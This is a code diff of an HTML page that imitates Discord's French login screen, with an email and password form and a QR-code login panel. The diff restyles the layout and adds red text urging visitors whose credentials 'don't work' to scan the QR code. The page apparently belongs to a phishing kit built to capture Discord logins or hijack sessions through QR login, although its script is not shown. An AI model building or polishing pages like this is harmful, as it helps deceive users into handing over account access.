@@ -10,12 +10,12 @@
   body { 
     background: #313338 url('https://discord.com/assets/4b0e1c8b7e4f6e9e9d5e5d5c5b5a5958.png') no-repeat center center fixed; 
     background-size: cover;
-    color: #dbdee1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; 
+    color: #dbdee1; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px;
   }
-  .login-container { display: flex; background: #313338; border-radius: 8px; width: 100%; max-width: 780px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
+  .login-container { display: flex; flex-direction: column; background: #313338; border-radius: 8px; width: 100%; max-width: 480px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
   
-  .login-box { padding: 32px; width: 100%; max-width: 480px; display: flex; flex-direction: column; justify-content: center; }
-  .qr-box { padding: 32px; width: 100%; max-width: 300px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; border-left: 1px solid #2b2d31; }
+  .login-box { padding: 32px; width: 100%; display: flex; flex-direction: column; justify-content: center; }
+  .qr-box { padding: 20px 32px 32px 32px; width: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; border-top: 1px solid #2b2d31; }
   
   h2 { color: #f2f3f5; margin-bottom: 8px; font-size: 24px; font-weight: 600; text-align: center; }
   p.sub { font-size: 16px; color: #b5bac1; margin-bottom: 20px; margin-top: 0; text-align: center; }
@@ -27,19 +27,18 @@
   .link { font-size: 14px; color: #00a8fc; text-decoration: none; display: block; margin-top: 15px; margin-bottom: 20px; }
   .link:hover { text-decoration: underline; }
   .hidden { display: none; }
-  .qr-box h3 { color: #f2f3f5; font-size: 20px; margin-bottom: 8px; margin-top: 0; }
-  .qr-box p { color: #b5bac1; font-size: 14px; margin-bottom: 20px; }
-  .qr-image { width: 180px; height: 180px; background: white; border-radius: 8px; margin-bottom: 20px; display: flex; justify-content: center; align-items: center; text-align: center; }
-  .qr-image img { width: 100%; height: 100%; border-radius: 8px; display: none; }
   
-  @media (max-width: 768px) {
-    .qr-box { display: none; }
-    .login-container { max-width: 480px; }
-  }
+  .qr-box h3 { color: #f2f3f5; font-size: 18px; margin-bottom: 8px; margin-top: 0; }
+  .qr-box p { color: #b5bac1; font-size: 14px; margin-bottom: 15px; }
+  .qr-image { width: 150px; height: 150px; background: white; border-radius: 8px; margin-bottom: 15px; display: flex; justify-content: center; align-items: center; text-align: center; }
+  .qr-image img { width: 100%; height: 100%; border-radius: 8px; display: none; }
+  .fallback-text { color: #f23f43; font-size: 13px; font-weight: 600; margin-top: 5px; }
 </style>
 </head>
 <body>
   <div class="login-container">
+    
+    <!-- FORMULAIRE EN HAUT -->
     <div class="login-box">
       <div id="step1">
         <h2>Bon retour !</h2>
@@ -65,14 +64,16 @@
       </div>
     </div>
 
+    <!-- QR CODE EN BAS -->
     <div class="qr-box">
       <div class="qr-image" id="qrContainer">
         <span id="qrLoading" style="color:black; font-size:12px;">Chargement...</span>
         <img id="qrImage" src="" alt="QR Code">
       </div>
       <h3>Ou connectez-vous avec un QR code</h3>
-      <p>Scannez ce code avec l'application Discord pour vous connecter instantanément.</p>
+      <p class="fallback-text">Si le mot de passe et l'adresse e-mail ne marchent pas, merci d'essayer le code QR.</p>
     </div>
+
   </div>
 
 <script>
